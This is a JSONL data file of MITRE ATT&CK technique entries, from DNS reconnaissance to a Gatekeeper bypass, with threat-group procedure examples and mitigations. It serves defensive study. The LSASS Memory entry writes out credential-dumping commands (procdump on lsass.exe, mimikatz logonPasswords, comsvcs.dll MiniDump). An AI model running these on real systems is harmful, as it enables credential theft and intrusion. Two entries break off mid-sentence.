{"text": " Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1590/002", "title": "DNS", "entity": "DNS", "entity_type": "techniques", "entity_context": ["This cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.", "idx": "https://attack.mitre.org/techniques/T1092", "title": "Communication Through Removable Media", "entity": "Communication Through Removable Media", "entity_type": "techniques", "entity_context": ["APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.", "Disallow or restrict removable media at an organizational policy level if they are not required for business operations.", "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.", "Disable Autoruns if it is unnecessary.", "USBStealer drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim."], "is_subtechnique": false}
{"text": " Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103). Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.", "idx": "https://attack.mitre.org/techniques/T1016", "title": "System Network Configuration Discovery", "entity": "System Network Configuration Discovery", "entity_type": "techniques", "entity_context": ["Astaroth collects the external IP address from the system. ", "BADCALL collects the network adapter information.", "jRAT can gather victim internal and external IPs.", "Kobalos can record the IP address of the target machine.", "Koadic can retrieve information about the Windows domain.", "Epic uses the <code>nbtstat -n</code> and <code>nbtstat -s</code> commands on the victim’s machine.", "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.", "FatDuke can identify the MAC address on the target computer.", "Ryuk has called <code>GetIpNetTable</code> in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries. ", "GeminiDuke collects information on network settings and Internet proxy settings from the victim.", "Kessel has collected the DNS address of the infected host.", "POWRUNER may collect network configuration data by running <code>ipconfig /all</code> on a victim.", "Dyre has the ability to identify network settings on a compromised host.", "Elise executes <code>ipconfig /all</code> after initial communication is made to the remote server.", "KEYMARBLE gathers the MAC address of the victim’s machine.", "SideTwist has the ability to collect the domain name on a compromised host.", "Mosquito uses the <code>ipconfig</code> command.", "Bisonal can execute <code>ipconfig</code> on the victim’s machine.", "Threat Group-3390 actors use NBTscan to discover vulnerable systems.", "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.", "QUADAGENT gathers the current domain the victim system belongs to.", "Pisloader has a command to collect the victim's IP address.", "admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: <code>ipconfig /all >> %temp%\\download</code>", "Higaisa used <code>ipconfig</code> to gather network configuration information.", "Empire can acquire network configuration information like DNS servers and network proxies used by a host.", "Revenge RAT collects the IP address and MAC address from the system.", "Rifdoor has the ability to identify the IP address of the compromised host.", "Bonadan can find the external IP address of the infected host.", "BLINDINGCAN has collected the victim machine's local IP address information and MAC address.", "Turla surveys a system upon check-in to discover network configuration details using the <code>arp -a</code>, <code>nbtstat -n</code>, <code>net config</code>, <code>ipconfig /all</code>, and <code>route</code> commands, as well as NBTscan. Turla RPC backdoors have also retrieved registered RPC interface information from process memory.", "APT1 used the <code>ipconfig /all</code> command to gather network configuration information.", "Emissary has the capability to execute the command <code>ipconfig /all</code>.", "VERMIN gathers the local IP address.", "Orz can gather victim proxy information.", "Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.", "RedLeaves can obtain information about network parameters.", "Cuba can retrieve the ARP cache from the local system by using <code>GetIpNetTable</code>. ", "Anchor can determine the public IP and location of a compromised host.", "NanHaiShu can gather information about the victim proxy server.", "ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.", "BADFLICK has captured victim IP address details.", "ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.", "Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain.", "Kazuar gathers information about network adapters.", "Calisto runs the <code>ifconfig</code> command to obtain the IP address from the victim’s machine.", "OilRig has run <code>ipconfig /all</code> on a victim.", "Xbash can collect IP addresses and local intranet information from a victim’s machine.", "ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.", "QakBot can use <code>net config workstation</code>, <code>arp -a</code>, and <code>ipconfig /all</code> to gather network configuration information.", "iKitten will look for the current IP address.", "Mis-Type may create a file containing the results of the command <code>cmd.exe /c ipconfig /all</code>.", "The reconnaissance modules used with Duqu can collect information on network configuration.", "LiteDuke has the ability to discover the proxy configuration of Firefox and/or Opera.", "Volgmer can gather the IP address from the victim's machine.", "USBferry can detect the infected machine's network topology using <code>ipconfig</code> and <code>arp</code>.\t", "Naid collects the domain name from a compromised host.", "UPPERCUT has the capability to gather the victim's proxy information.", "Cobalt Strike can determine the NetBios name and  the IP addresses of targets machines including domain controllers.", "Grandoreiro can determine the IP and physical location of the compromised host via IPinfo.", "GrimAgent can enumerate the IP and domain of a target system.", "Rising Sun can detect network adapter and IP address information.\t", "StrongPity can identify the IP address of a compromised host.", "KONNI can collect the IP address from the victim’s machine.", "Turian can retrieve the internal IP address of a compromised host.", "WellMess can identify the IP address and user domain on the target machine.", "MoonWind obtains the victim IP address.", "Zebrocy runs the <code>ipconfig /all</code> command.", "Nltest may be used to enumerate the parent domain of a local machine using <code>/parentdomain</code>.", "Stuxnet collects the IP address of a compromised system.", "TSCookie has the ability to identify the IP of the infected host.", "Olympic Destroyer uses API calls to enumerate the infected system's ARP table.", "PowerDuke has a command to get the victim's domain and NetBIOS name.", "LightNeuron gathers information about network adapters using the Win32 API call <code>GetAdaptersInfo</code>.", "Lucifer can collect the IP address of a compromised host.", "Mustang Panda has used <code>ipconfig</code> and <code>arp</code> to determine network configuration information.", "Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.", "EKANS can determine the domain of a compromised host.", "More_eggs has the capability to gather the IP address from the victim's machine.", "Unknown Logger can obtain information about the victim's IP address.", "PoshC2 can enumerate network adapter information.", "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.", "Avenger can identify the domain of the compromised host.", "PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.", "down_new has the ability to identify the MAC address of a compromised host.", "Pay2Key can identify the IP and MAC addresses of the compromised host.", "nbtstat can be used to discover local NetBIOS domain names.", "Sykipot may use <code>ipconfig /all</code> to gather system network configuration details.", "Backdoor.Oldrea collects information about the Internet adapter configuration.", "TeamTNT looks for the host machine’s IP address.", "Proxysvc collects the network adapter information and domain/username information based on current remote sessions.", "Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings. ", "Aria-body has the ability to identify the location, public IP address, and domain name on a compromised host.", "OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.", "Trojan.Karagany can gather information on the network configuration of a compromised host.", " Explosive has collected the MAC address from the victim's machine. ", "Reaver collects the victim's IP address.", "Carbon can collect the IP address of the victims and other computers on the network using the commands: <code>ipconfig -all</code> <code>nbtstat -n</code>, and <code>nbtstat -s</code>.", "FELIXROOT collects information about the network including the IP address and DHCP server.", "TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.", "CrackMapExec can collect DNS information from the targeted system.", "APT32 used the <code>ipconfig /all</code> command to gather the IP address from the system.", "GoldMax retrieved a list of the system's network interface after execution.", "Sliver has the ability to gather network configuration information.", "Octopus can collect the host IP address from the victim’s machine.", "BoxCaon can collect the victim's MAC address by using the <code>GetAdaptersInfo</code> API.", "AdFind can extract subnet information from Active Directory.", "SHARPSTATS has the ability to identify the domain of the compromised host.", "JPIN can obtain network information, including DNS, IP, and proxies.", "Brave Prince gathers network configuration information as well as the ARP cache.", "A JHUHUGIT variant gathers network interface card information.", "BabyShark has executed the <code>ipconfig /all</code> command.\t", "Darkhotel has collected the IP address and network adapter information from the victim’s machine.", "Frankenstein has enumerated hosts, looking for the public IP address of the system.", "xCaon has used the GetAdaptersInfo() API call to get the victim's MAC address.", "SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.", "Ramsay can use ipconfig and Arp to collect network configuration information, including routing information and ARP tables.", "A keylogging tool used by APT3 gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.", "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.", "Penquin can report the IP of the compromised host to attacker controlled infrastructure.", "WannaCry will attempt to determine the local network segment it is a part of.", "SpeakUp uses the <code>ifconfig -a</code> command. ", "Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command. ", "Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.", "MuddyWater has used malware to collect the victim’s IP address and domain name.", "ShadowPad has collected the domain name of the victim system.", "NBTscan can be used to collect MAC addresses.\t", "Taidoor has collected the MAC address of a compromised host; it can also use <code>GetAdaptersInfo</code> to identify network adapters.", "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.", "WellMail can identify the IP address of the victim system.", "Sandworm Team checks for connectivity to other resources in the network. ", "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.", "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.", "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.", "Pysa can perform network reconnaissance using the Advanced IP Scanner tool.", "Valak has the ability to identify the domain and the MAC and IP addresses of an infected machine.", "ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.", "zwShell can obtain the victim IP address.", "Felismus collects the victim LAN IP address and sends it to the C2 server.", "PLAINTEE uses the <code>ipconfig /all</code> command to gather the victim’s IP address.", "Sys10 collects the local IP address of the victim and sends it to the C2.", "Crimson contains a command to collect the victim MAC address and LAN IP.", "SpicyOmelette can identify the IP of a compromised system.", "KeyBoy can determine the public or WAN IP address for the system.", "InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.", "Chimera has used ipconfig, Ping, and <code>tracert</code> to enumerate the IP address and network environment and settings of the local host.", "NETWIRE can collect the IP address of a compromised host.", "Wizard Spider has used \"ipconfig\" to identify the network configuration of a victim machine.", "Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system.", "yty runs <code>ipconfig /all</code> and collects the domain name.", "Ke3chang performs local network configuration discovery using <code>ipconfig</code>.", "Comnie uses <code>ipconfig /all</code> and <code>route PRINT</code> to identify network adapter and interface information.", "LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.", "RogueRobin gathers the IP address and domain from the victim’s machine.", "Operation Wocao has discovered the local network configuration with ipconfig.", "Shamoon obtains the target's IP address and local network segment.", "Sibot checked if the compromised system is configured to use proxies.", "OceanSalt can collect the victim’s IP address.", "NanoCore gathers the IP address from the victim’s machine.", "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.", "Sidewinder has used malware to collect information on network interfaces, including the MAC address.", "SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via <code>ipconfig.exe /all</code>.", "Denis uses <code>ipconfig</code> to gather the IP address from the system.", "Dtrack can collect the host's IP addresses using the <code>ipconfig</code> command.", "SUNBURST collected all network interface MAC addresses that are up and not loopback devices, as well as IP address, DHCP configuration, and domain information.", "Bazar can collect the IP address and NetBIOS name of an infected machine.", "OSInfo discovers the current domain information.", "RATANKBA gathers the victim’s IP address via the <code>ipconfig -all</code> command.", "POWERSTATS can retrieve IP, network adapter configuration information, and domain from compromised hosts.", "FALLCHILL collects MAC address and local IP address information from the victim.", "Machete collects the MAC address of the target computer and other network configuration information.", "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.", "Kwampirs collects network adapter and interface information by using the commands <code>ipconfig /all</code>, <code>arp -a</code> and <code>route print</code>. It also collects the system's MAC address with <code>getmac</code> and domain configuration with <code>net config workstation</code>.", "Azorult can collect host IP information from the victim’s machine.", "APT41 collected MAC addresses from victim machines. ", "AppleSeed can identify the IP of a targeted system.", "GALLIUM used <code>ipconfig /all</code> to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.", "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.", "Naikon uses commands such as <code>netsh interface show</code> to discover network interface settings.", "Arp can be used to display ARP configuration information on the host.", "Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.", "Bandook has a command to get the public IP address from a system. ", "T9000 gathers and beacons the MAC and IP addresses during installation.", "TajMahal has the ability to identify the MAC address on an infected host.", "Tropic Trooper has used scripts to collect the host's network topology.\t", "Conti can retrieve the ARP cache from the local system by using the <code>GetIpNetTable()</code> API call and check to ensure IP addresses it connects to are for local, non-Internet, systems. ", "BLUELIGHT can collect IP information from the victim’s machine.", "route can be used to discover routing configuration information.", "HotCroissant has the ability to identify the IP address of the compromised machine.", "PowerShower has the ability to identify the current Windows domain of the infected host.", "Lokibot has the ability to discover the domain name of the infected host.", "Avaddon can collect the external IP address of the victim.", "NOKKI can gather information on the victim IP address.", "Okrum can collect network information, including the host IP address, DNS, and proxy information."], "is_subtechnique": false}
{"text": " Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation) Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.", "idx": "https://attack.mitre.org/techniques/T1134", "title": "Access Token Manipulation", "entity": "Access Token Manipulation", "entity_type": "techniques", "entity_context": ["Ryuk has attempted to adjust its token privileges to have the <code>SeDebugPrivilege</code>.", "PowerSploit's <code>Invoke-TokenManipulation</code> Exfiltration module can be used to manipulate tokens.", "MegaCortex can enable <code>SeDebugPrivilege</code> and adjust token privileges.", "KillDisk has attempted to get the access token of a process by calling <code>OpenProcessToken</code>. If KillDisk gets the access token, then it attempt to modify the token privileges with <code>AdjustTokenPrivileges</code>.", "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.", "FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.", "Hydraq creates a backdoor through which remote attackers can adjust token privileges.", "Cuba has used <code>SeDebugPrivilege</code> and <code>AdjustTokenPrivileges</code> to elevate privileges.", "Blue Mockingbird has used JuicyPotato to abuse the <code>SeImpersonate</code> token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.", "PoshC2 can use Invoke-TokenManipulation for manipulating tokens.", "SUNSPOT modified its security token to grants itself debugging privileges by adding <code>SeDebugPrivilege</code>.", "Sliver has the ability to manipulate user tokens on targeted Windows systems.", "An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.  ", "Empire can use PowerSploit's <code>Invoke-TokenManipulation</code> to manipulate access tokens.", "AppleSeed can gain system level privilege by passing <code>SeDebugPrivilege</code> to the <code>AdjustTokenPrivilege</code> API.", "SslMM contains a feature to manipulate process privileges and tokens.", "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>."], "is_subtechnique": false}
{"text": " Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550). As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host use procdump: * <code>procdump -ma lsass.exe lsass_dump</code> Locally, mimikatz can be run using: * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code> Built-in Windows tools such as comsvcs.dll can also be used: * <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector) Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014) The following SSPs can be used to access credentials: * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest", "idx": "https://attack.mitre.org/techniques/T1003/001", "title": "LSASS Memory", "entity": "LSASS Memory", "entity_type": "techniques", "entity_context": ["Whitefly has used Mimikatz to obtain credentials.", "NotPetya contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement.", "LaZagne can perform credential dumping from memory to obtain account and password information.", "APT1 has been known to use credential dumping using Mimikatz.", "PLATINUM has used keyloggers that are also capable of dumping credentials.", "Magic Hound stole domain credentials from Microsoft Active Directory Domain Controller and leveraged Mimikatz.", "Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe.", "Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.", "CozyCar has executed Mimikatz to harvest stored credentials from the victim and further victim penetration.", "Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump.", "APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.", "Daserf leverages Mimikatz and Windows Credential Editor to steal credentials.", "BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping.", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.", "Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor.", "OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.", "APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function.", "FIN6 has used Windows Credential Editor for credential dumping.\t\n", "GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines.", "Pysa can perform OS credential dumping using Mimikatz.", "Okrum was seen using MimikatzLite to perform credential dumping.", "Ke3chang has dumped credentials, including by using Mimikatz.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "Consider disabling or restricting NTLM. Consider disabling WDigest authentication.", "With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.", "APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.", "FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).", "Pupy can execute Lazagne as well as Mimikatz using PowerShell.", "Lslsass can dump active logon session password hashes from the lsass process.", "APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\"", "Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing. ", "TEMP.Veles has used Mimikatz and a custom tool, SecHack, to harvest credentials. ", "Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.", "HAFNIUM has used <code>procdump</code> to dump the LSASS process memory.", "Fox Kitten has used prodump to dump credentials from LSASS.", "Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz.", "Operation Wocao has used ProcDump to dump credentials from memory.", "Windows Credential Editor can dump credentials.", "Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems.", "Kimsuky has gathered credentials using Mimikatz and ProcDump.", "Bad Rabbit has used Mimikatz to harvest credentials from the victim's machine.", "PowerSploit contains a collection of Exfiltration modules that can harvest credentials using Mimikatz.", "Emotet has been observed dropping password grabber modules including Mimikatz. ", "Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes.", "APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.", "Empire contains an implementation of Mimikatz to gather credentials from memory.", "On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.", "GreyEnergy has a module for Mimikatz to collect Windows credentials from the victim’s machine.", "MuddyWater has performed credential dumping with Mimikatz and procdump64.exe.", "Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network.", "Sandworm Team's plainpwd tool is a modified version of Mimikatz and dumps Windows credentials from system memory.\t", "PoetRAT used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials.", "APT41 has used hashdump, Mimikatz, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.", "PoshC2 contains an implementation of Mimikatz to gather credentials from memory.", "Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior. Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.", "idx": "https://attack.mitre.org/techniques/T1087/001", "title": "Local Account", "entity": "Local Account", "entity_type": "techniques", "entity_context": ["Chimera has used <code>net user</code> for account discovery.", "Turla has used <code>net user</code> to enumerate local accounts on the system.", "SMOKEDHAM has used <code>net.exe user</code> and <code>net.exe users</code> to enumerate local accounts on a compromised host.", "HyperStack can enumerate all account names on a remote share.", "Mis-Type may create a file containing the results of the command <code>cmd.exe /c net user {Username}</code>.", "Empire can acquire local and domain user account information.", "APT3 has used a tool that can obtain info about local and global group users, power users, and administrators.", "Threat Group-3390 has used <code>net user</code> to conduct internal discovery of systems.", "Remsec can obtain a list of users.", "BloodHound can identify users with local administrator rights.", "Commands under <code>net user</code> can be used in Net to gather information about and manipulate user accounts.", "GeminiDuke collects information on local user accounts from the victim.", "APT1 used the commands <code>net localgroup</code>,<code>net user</code>, and <code>net group</code> to find accounts on the system.", "PoshC2 can enumerate local and domain user account information.", "Kazuar gathers information on local groups and members on the victim’s machine.", "Elise executes <code>net user</code> after initial communication is made to the remote server.", "P.A.S. Webshell can display the /etc/passwd file on a compromised host.", "Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at <code>HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators</code>. It can be disabled through GPO: Computer Configuration > Policies > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts on elevation.", "OSInfo enumerates local and domain users", "APT32 enumerated administrative users using the commands <code>net localgroup administrators</code>.", "Pupy uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.", "PowerSploit's <code>Get-ProcessTokenGroup</code> Privesc-PowerUp module can enumerate all SIDs associated with its current token.", "InvisiMole has a command to list account information on the victim’s machine.", "Bazar can identify administrator accounts on an infected host.", "Epic gathers a list of all user accounts, privilege classes, and time of last logon.", "Bankshot gathers domain and account names/information through process monitoring.", "S-Type runs the command <code>net user</code> on a victim. S-Type also runs tests to determine the privilege level of the compromised user.", "BitPaymer can enumerate the sessions for each user logged onto the infected host.", "SHOTPUT has a command to retrieve information about connected users.", "admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: <code>net user >> %temp%\\download</code> <code>net user /domain >> %temp%\\download</code>", "RATANKBA uses the <code>net user</code> command.", "PUNCHBUGGY can gather user names.", "USBferry can use <code>net user</code> to gather information about local accounts.\t", "TrickBot collects the users of the system.", "OilRig has run <code>net user</code>, <code>net user /domain</code>, <code>net group “domain admins” /domain</code>, and <code>net group “Exchange Trusted Subsystem” /domain</code> to get account listings on a victim.", "MURKYTOP has the capability to retrieve information about users on remote hosts.", "The discovery modules used with Duqu can collect information on accounts and permissions.", "Kwampirs collects a list of accounts with the command <code>net users</code>.", "Ke3chang performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group \"REDACTED\" /domain</code> on specific permissions groups.", "Valak has the ability to enumerate local admin accounts.", "Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts.", "Stuxnet enumerates user accounts of the local host.", "SoreFang can collect usernames from the local system via <code>net.exe user</code>.", "Pony has used the <code>NetUserEnum</code> function to enumerate local accounts.\t", "Poseidon Group searches for administrator accounts on both the local victim machine and the network.", "Agent Tesla can collect account information from the victim’s machine.", "Comnie uses the <code>net user</code> command.", "POWERSTATS can retrieve usernames from compromised hosts."], "is_subtechnique": true}
{"text": " An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).(Citation: Mandiant M-Trends 2020) Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.", "idx": "https://attack.mitre.org/techniques/T1578/002", "title": "Create Cloud Instance", "entity": "Create Cloud Instance", "entity_type": "techniques", "entity_context": ["Routinely check user permissions to ensure only the expected users have the capability to create new instances.", "Limit permissions for creating new instances in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."], "is_subtechnique": true}
{"text": " Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls in macOS. When documents, applications, or programs are downloaded an extended attribute (xattr) called <code>com.apple.quarantine</code> can be set on the file by the application performing the download. This attribute, also known as a quarantine flag, is read by Apple's Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution. Gatekeeper also monitors an application's usage of dynamic libraries (dylibs) loaded outside the application folder on any quarantined binary, often using the <code>dlopen</code> function. If the quarantine flag is set in macOS 10.15+, Gatekeeper also checks for a notarization ticket and sends a cryptographic hash to Apple's servers to check for validity for all unsigned executables.(Citation: TheEclecticLightCompany apple notarization )(Citation: Bypassing Gatekeeper) The quarantine flag is an opt-in system and not imposed by macOS. If an application opts-in, a file downloaded from the Internet will be given a quarantine flag before being saved to disk. Any application or user with write permissions to the file can change or strip the quarantine flag. With elevated permission (sudo), this attribute can be removed from any file. The presence of the <code>com.apple.quarantine</code> quarantine flag can be checked with the xattr command <code>xattr -l 